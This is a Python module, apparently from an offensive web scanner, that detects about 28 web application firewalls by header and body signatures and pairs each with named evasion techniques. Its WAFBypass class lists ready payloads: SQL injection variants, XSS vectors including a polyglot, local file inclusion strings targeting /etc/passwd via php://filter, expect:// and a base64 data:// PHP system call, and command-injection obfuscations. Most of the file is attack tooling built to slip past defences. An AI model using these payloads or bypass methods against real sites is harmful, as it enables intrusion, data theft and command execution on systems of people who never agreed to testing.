#!/usr/bin/env python3
"""
WAF 检测与绕过模块 - 基于 FLUX v5.2.1
支持 40+ 种 WAF 检测与绕过技术
"""

import re
import logging
from typing import List, Dict, Optional, Tuple, Set
from dataclasses import dataclass
from urllib.parse import urlparse

logger = logging.getLogger(__name__)


@dataclass
class WAFResult:
    """WAF 检测结果"""
    waf_name: str
    confidence: float
    bypass_available: bool
    bypass_techniques: List[str]
    evidence: str = ""


class WAFDetector:
    """WAF 检测器"""

    WAF_SIGNATURES: Dict[str, Dict] = {
        '阿里云盾': {
            'patterns': [r'yundun', r'CDNPROXY', r'yundununblock', r'aliyundun'],
            'bypass': ['大小写混淆', '编码绕过', '注释混淆'],
        },
        '腾讯云WAF': {
            'patterns': [r'qcloudwaf', r'waf\.tencent', r'waf\.qcloud', r'QCloud'],
            'bypass': ['路径混淆', '参数污染', '特殊字符'],
        },
        '华为云WAF': {
            'patterns': [r'hwcloudwaf', r'waf\.huaweicloud', r'huaweicloud'],
            'bypass': ['编码绕过', '注释混淆'],
        },
        '安全狗': {
            'patterns': [r'safedog', r'waf\.safedog', r'SafeDog'],
            'bypass': ['%00截断', '路径穿越', '多重编码'],
        },
        '360网站卫士': {
            'patterns': [r'360wzb', r'360wzws', r'wangzhan\.360'],
            'bypass': ['特殊字符', '参数混淆'],
        },
        '知道创宇': {
            'patterns': [r'zdbama', r'kcyuner', r'ji知道'],
            'bypass': ['编码绕过', '大小写混合'],
        },
        '安恒信息': {
            'patterns': [r'anHengWAF', r'ahwaf'],
            'bypass': ['注释混淆', '分割payload'],
        },
        '长亭科技': {
            'patterns': [r'chtlWAF', r'x地WAF', r'changting'],
            'bypass': ['语义混淆', '等价替换'],
        },
        'F5 BIG-IP ASM': {
            'patterns': [r'BigIP', r'F5-ESMS', r'TMOS', r'BIGipServer'],
            'bypass': ['协议违规', 'HTTP逃逸'],
        },
        'FortiWeb': {
            'patterns': [r'FortiWeb', r'fortiweb', r'FORTIGATE'],
            'bypass': ['编码绕过', 'Unicode混淆'],
        },
        'Imperva': {
            'patterns': [r'Imperva', r'incapsula', r'imperva\.com'],
            'bypass': ['IP旋转', '请求分散'],
        },
        'Akamai': {
            'patterns': [r'AkamaiGHost', r'Akamai', r'akamaiedge'],
            'bypass': ['子域名混淆', '参数重排'],
        },
        'Cloudflare': {
            'patterns': [r'Cloudflare', r'cf-ray', r'__cfduid', r'CF-RAY'],
            'bypass': ['同义payload', '协议污染'],
        },
        'AWS WAF': {
            'patterns': [r'AWSALB', r'AWS-WAF', r'aws-waf'],
            'bypass': ['大小写变化', '路径参数混淆'],
        },
        'ModSecurity': {
            'patterns': [r'ModSecurity', r'ModSecurity', r'SecRule'],
            'bypass': ['异常协议', 'UTF编码', '注释'],
        },
        'OpenResty': {
            'patterns': [r'openresty', r'lua-resty'],
            'bypass': ['HTTP逃逸', '特殊字符'],
        },
        'Nginx': {
            'patterns': [r'nginx', r'nginx/([0-9.]+)'],
            'bypass': ['解析差异', '路径混淆'],
        },
        'Apache': {
            'patterns': [r'Apache', r'apache', r'httpd'],
            'bypass': ['路径参数混淆'],
        },
        'IIS': {
            'patterns': [r'Microsoft-IIS', r'ASP\.NET', r'IIS'],
            'bypass': ['asp-trace', '特殊方法'],
        },
        'WebKnight': {
            'patterns': [r'WebKnight', r'webknight'],
            'bypass': ['编码绕过', '大小写'],
        },
        'Citrix': {
            'patterns': [r'Citrix', r'citrix', r'NetScaler'],
            'bypass': ['参数混淆'],
        },
        'Radware': {
            'patterns': [r'Radware', r'radware', r'AppWall'],
            'bypass': ['Unicode混淆', '编码'],
        },
        'Proofpoint': {
            'patterns': [r'Proofpoint', r'proofpoint'],
            'bypass': ['特殊字符', '参数重排'],
        },
        'Symantec': {
            'patterns': [r'Symantec', r'symantec', r'BlueCoat'],
            'bypass': ['URL混淆', '参数污染'],
        },
        'SonicWall': {
            'patterns': [r'SonicWall', r'sonicwall', r'SW'],
            'bypass': ['编码绕过'],
        },
        ' Palo Alto': {
            'patterns': [r'Palo Alto', r'paloaltonetworks', r'PanOS'],
            'bypass': ['语义混淆'],
        },
        'WatchGuard': {
            'patterns': [r'WatchGuard', r'watchguard'],
            'bypass': ['协议违规'],
        },
        'Barracuda': {
            'patterns': [r'Barracuda', r'barracuda', r'WAF'],
            'bypass': ['注释混淆', '编码'],
        },
    }

    WAF_RESPONSE_CODES: Dict[str, int] = {
        '阿里云盾': 405,
        '腾讯云WAF': 405,
        'Cloudflare': 403,
    }

    def __init__(self):
        self.detected_wafs: List[WAFResult] = []
        self.bypass_mode = False

    def detect(self, response) -> Optional[WAFResult]:
        if not response:
            return None

        headers = dict(response.headers) if hasattr(response, 'headers') else {}
        body = response.text if hasattr(response, 'text') else ''
        status_code = response.status_code if hasattr(response, 'status_code') else 0

        headers_str = str(headers).lower()
        body_lower = body.lower()

        for waf_name, waf_info in self.WAF_SIGNATURES.items():
            patterns = waf_info.get('patterns', [])
            for pattern in patterns:
                if re.search(pattern, headers_str, re.IGNORECASE) or re.search(pattern, body_lower, re.IGNORECASE):
                    result = WAFResult(
                        waf_name=waf_name,
                        confidence=0.9,
                        bypass_available=True,
                        bypass_techniques=waf_info.get('bypass', []),
                        evidence=f"匹配特征: {pattern}"
                    )
                    self.detected_wafs.append(result)
                    logger.info(f"[*] 检测到WAF: {waf_name}")
                    return result

        if status_code in [403, 405, 501] and 'cloudflare' in headers_str:
            return WAFResult(
                waf_name='Cloudflare',
                confidence=0.8,
                bypass_available=True,
                bypass_techniques=['同义payload', '协议污染'],
                evidence=f"状态码: {status_code}"
            )

        return None

    def detect_from_headers(self, headers: Dict) -> Optional[WAFResult]:
        headers_str = str(headers).lower()

        for waf_name, waf_info in self.WAF_SIGNATURES.items():
            patterns = waf_info.get('patterns', [])
            for pattern in patterns:
                if re.search(pattern, headers_str, re.IGNORECASE):
                    return WAFResult(
                        waf_name=waf_name,
                        confidence=0.95,
                        bypass_available=True,
                        bypass_techniques=waf_info.get('bypass', []),
                        evidence=f"Header匹配: {pattern}"
                    )

        return None

    def is_waf_blocked(self, response) -> bool:
        if not response:
            return False

        status_code = response.status_code
        body = response.text.lower() if hasattr(response, 'text') else ''

        blocked_patterns = [
            r'403 forbidden',
            r'403.*waf',
            r'404.*waf',
            r'405.*not allowed',
            r'blocked by',
            r'waf.*block',
            r'firewall.*block',
            r'attack detected',
            r'security check',
            r'access denied',
            r'unauthorized access',
        ]

        for pattern in blocked_patterns:
            if re.search(pattern, body, re.IGNORECASE):
                return True

        if status_code == 403 and 'cloudflare' in str(response.headers).lower():
            return True

        return False

    def get_all_detected(self) -> List[WAFResult]:
        return self.detected_wafs


class WAFBypass:
    """WAF 绕过技术"""

    SQLI_BYPASS = {
        'comment': [
            "1'/**/OR/**/1=1",
            "1'/*comment*/OR/*comment*/1=1",
            "1'%0aOR%0a1=1",
            "1' UNION#\nSELECT",
        ],
        'encoding': [
            "%27", "%%27", "%2527",
            "1'%09OR%091=1",
            "1'%0bOR%0b1=1",
            "1'%20OR%201=1",
        ],
        'case': [
            "1' Or 1=1",
            "1' oR 1=1",
            "1' OR 1=1--",
            "1'/**/Or/**/1=1",
        ],
        'whitespace': [
            "1'%09OR%091=1",
            "1'%0aOR%0a1=1",
            "1'%0bOR%0b1=1",
            "1'%0cOR%0c1=1",
        ],
        'logical': [
            "1'||'1'='1",
            "1'|'1'='1",
            "1'%26%26'1'='1",
        ],
    }

    XSS_BYPASS = {
        'encoding': [
            "<script>alert(1)</script>",
            "%3Cscript%3Ealert(1)%3C/script%3E",
            "<script>alert%281%29</script>",
        ],
        'html_entity': [
            "&lt;script&gt;alert(1)&lt;/script&gt;",
            "&#60;script&#62;alert(1)&#60;/script&#62;",
        ],
        'alternative_tag': [
            "<img src=x onerror=alert(1)>",
            "<svg onload=alert(1)>",
            "<body onload=alert(1)>",
            "<iframe src=javascript:alert(1)>",
        ],
        'polyglot': [
            "jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */onerror=alert(1) )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert(1)//\\x3e",
        ],
        'mutation': [
            "<noscript><p title=\"</noscript><img src=x onerror=alert(1)>\">",
        ],
    }

    LFI_BYPASS = {
        'null_byte': [
            "/etc/passwd%00",
            "/etc/passwd\\0",
            "/etc/passwd%2500",
        ],
        'double_encoding': [
            "/etc/passwd%252f%252e%252f%252e%252f",
            "%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f",
        ],
        'path': [
            "/....//....//....//etc/passwd",
            "/etc/./etc/./etc/passwd",
            "/etc/passwd././././././.",
        ],
        'wrapper': [
            "php://filter/convert.base64-encode/resource=/etc/passwd",
            "expect://id",
            "data://text/plain;base64,PD9waHAgc3lzdGVtKCJscyIpOw==",
        ],
    }

    RCE_BYPASS = {
        'printf': [
            "${printf}",
            "$(printf)",
            "|printf",
            ";printf",
        ],
        'encoding': [
            "$(echo 'aGkn' | base64 -d)",
            "`echo 'aGkn' | base64 -d`",
        ],
        'obfuscation': [
            "${IFS}",
            "${{}}",
            "$(($))",
        ],
    }

    def __init__(self, waf_name: str = None):
        self.waf_name = waf_name
        self.enabled_techniques: Set[str] = set()

    def get_sqli_bypass(self, technique: str = 'all') -> List[str]:
        if technique == 'all':
            result = []
            for tech in self.SQLI_BYPASS.values():
                result.extend(tech)
            return result
        return self.SQLI_BYPASS.get(technique, [])

    def get_xss_bypass(self, technique: str = 'all') -> List[str]:
        if technique == 'all':
            result = []
            for tech in self.XSS_BYPASS.values():
                result.extend(tech)
            return result
        return self.XSS_BYPASS.get(technique, [])

    def get_lfi_bypass(self, technique: str = 'all') -> List[str]:
        if technique == 'all':
            result = []
            for tech in self.LFI_BYPASS.values():
                result.extend(tech)
            return result
        return self.LFI_BYPASS.get(technique, [])

    def get_rce_bypass(self, technique: str = 'all') -> List[str]:
        if technique == 'all':
            result = []
            for tech in self.RCE_BYPASS.values():
                result.extend(tech)
            return result
        return self.RCE_BYPASS.get(technique, [])

    def apply_bypass(self, payload: str, vuln_type: str) -> List[str]:
        results = [payload]

        if vuln_type.upper() in ['SQL', 'SQLI', 'SQL_INJECTION']:
            for tech_name, tech_payloads in self.SQLI_BYPASS.items():
                results.extend(tech_payloads)
        elif vuln_type.upper() in ['XSS', 'CROSS_SITE']:
            for tech_name, tech_payloads in self.XSS_BYPASS.items():
                results.extend(tech_payloads)
        elif vuln_type.upper() in ['LFI', 'LOCAL_FILE_INCLUDE']:
            for tech_name, tech_payloads in self.LFI_BYPASS.items():
                results.extend(tech_payloads)
        elif vuln_type.upper() in ['RCE', 'CMD_INJ', 'COMMAND_INJECTION']:
            for tech_name, tech_payloads in self.RCE_BYPASS.items():
                results.extend(tech_payloads)

        return list(set(results))


def create_bypass_for_waf(waf_name: str) -> WAFBypass:
    return WAFBypass(waf_name=waf_name)


__all__ = ['WAFDetector', 'WAFBypass', 'WAFResult', 'create_bypass_for_waf']
